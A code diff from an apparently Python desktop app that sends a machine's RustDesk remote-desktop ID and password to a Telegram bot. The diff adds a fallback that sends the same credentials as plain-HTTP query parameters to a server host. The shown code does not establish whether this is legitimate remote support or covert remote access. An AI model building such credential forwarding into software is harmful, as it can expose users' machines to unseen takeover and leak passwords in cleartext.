@@ -126,17 +126,28 @@ def get_rustdesk_id():
     return None
 
 def send_to_bot(rd_id: str, password: str, chat_id: int):
-    """Отправить данные подключения в Telegram бот — с retry"""
-    msg = "🖥 Клиент подключился!\n\nRustDesk ID: " + str(rd_id) + "\nПароль: " + str(password)
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    for attempt in range(5):
+    """Отправить данные подключения — Telegram + fallback на VPS"""
+    msg_text = "Client connected!\n\nRustDesk ID: " + str(rd_id) + "\nPassword: " + str(password) + "\nChat: " + str(chat_id)
+    
+    # 1. Попытка через Telegram
+    tg_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    for attempt in range(3):
         try:
-            r = requests.post(url, json={"chat_id": chat_id, "text": msg}, timeout=15)
+            r = requests.post(tg_url, json={"chat_id": chat_id, "text": "🖥 " + msg_text}, timeout=15)
             if r.ok:
                 return
         except Exception:
             pass
-        time.sleep(3)
+        time.sleep(2)
+    
+    # 2. Fallback: отправить на VPS (http - работает даже без HTTPS)
+    try:
+        import urllib.request
+        import urllib.parse
+        params = urllib.parse.urlencode({"id": str(rd_id), "chat": str(chat_id), "pw": str(password)})
+        urllib.request.urlopen(f"http://{SERVER_HOST}/notify?" + params, timeout=10)
+    except Exception:
+        pass
 
 class AIMasterApp:
     def __init__(self):
